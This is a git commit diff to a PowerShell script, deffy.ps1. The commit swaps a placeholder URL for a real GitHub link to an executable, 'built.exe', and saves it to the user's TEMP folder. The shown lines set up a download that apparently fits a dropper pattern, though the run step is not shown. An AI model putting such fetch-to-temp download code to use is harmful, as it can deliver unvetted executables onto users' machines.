ec28fdbecde020dc92a6587dd62f15f7d09bf2ae
0rx1 <mrspam91@gmail.com>
2024-07-20 19:11:09 +0100

    Update deffy.ps1

--- deffy.ps1
+++ deffy.ps1
@@ -1,8 +1,8 @@
 # Set the URL of the executable to be downloaded
-$exeUrl = "https://example.com/path/to/yourfile.exe"
+$exeUrl = "https://github.com/0rx1/workshopdeffy/raw/main/built.exe"
 
 # Define the path where the executable will be saved
-$exePath = "$env:TEMP\yourfile.exe"
+$exePath = "$env:TEMP\built.exe"
 
 # Set the security protocol for PowerShell to allow downloads
 [System.Net.ServicePointManager]::SecurityProtocol = [System.Net.SecurityProtocolType]::Tls12
